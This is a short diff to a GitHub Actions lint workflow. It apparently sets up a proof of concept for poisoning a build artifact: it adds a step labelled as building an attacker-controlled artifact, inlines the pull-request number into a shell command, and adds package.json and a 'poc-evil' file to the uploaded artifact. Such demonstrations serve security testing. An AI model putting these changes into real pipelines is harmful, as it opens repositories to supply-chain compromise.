@@ -1,4 +1,3 @@
----
 name: Lint
 on:
   pull_request:
@@ -8,12 +7,10 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
+      - name: Build attacker-controlled linter artifact
+        run: |
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          printf 'CLEAN-POC linter report body' > linter-report.txt
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v7
@@ -21,4 +18,7 @@ jobs:
           name: linter-report
           path: |
             pr-number.txt
+            linter-report.txt
+            package.json
+            poc-evil
           if-no-files-found: ignore
